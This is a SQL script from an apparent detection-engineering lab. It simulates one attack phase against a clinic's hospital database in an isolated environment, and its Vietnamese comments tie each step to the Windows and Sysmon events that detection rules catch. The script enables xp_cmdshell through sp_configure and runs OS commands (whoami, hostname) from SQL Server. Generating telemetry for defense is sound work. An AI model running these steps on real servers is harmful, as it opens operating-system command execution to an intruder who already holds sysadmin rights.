/*
================================================================================
Tep: 02_telemetry_and_scenarios/scenario_03_his_db_tampering/enable_xp_cmdshell_15457.sql

KICH BAN 3 - PHA P3: bat xp_cmdshell de thuc thi lenh he dieu hanh tu trong SQL.
Chay trong LAB CO LAP (clinic.local)

TIEN DE: phien ket noi nay da o quyen sysadmin (lay duoc o pha P2 - leo thang qua single-user mode, xem scenario_03/README.md). 
Neu chay bang SVC_HIS_Database thuong (chi db_datareader/writer) thi sp_configure se bi tu choi.

TELEMETRY sinh ra de bat:
  - Event ID 15457 (Windows Application Log, source MSSQLSERVER): moi lan doi
    sp_configure deu ghi 1 ban ghi 15457. Nguon: NetSPI PowerUpSQL wiki +
    Microsoft Learn sp_configure. Xem docs/PROVENANCE_detection_rules.md.
  - Sysmon Event ID 1: sqlservr.exe sinh cmd.exe -> chinh la chu ky luat SC3-V1.
    Mau lenh tham khao Atomic Red Team T1059.003 (redcanaryco/atomic-red-team).

GHI TIMESTAMP: chay SELECT SYSDATETIME(); truoc va sau de gan nhan tinh cho .evtx.
================================================================================
*/

SELECT SYSDATETIME() AS P3_BatDau;
GO

-- 1. Mo advanced options (sinh Event ID 15457 lan 1)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
GO

-- 2. Bat xp_cmdshell (sinh Event ID 15457 lan 2 - day la ban ghi trong tam luat V1 bat)
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- 3. Chay thu 1 lenh OS: sqlservr.exe sinh cmd.exe -> Sysmon Event ID 1 (chu ky SC3-V1)
--    whoami de xac nhan dang chay duoi service account cua SQL (thuong la quyen cao).
EXEC xp_cmdshell 'whoami & hostname';
GO

SELECT SYSDATETIME() AS P3_KetThuc;
GO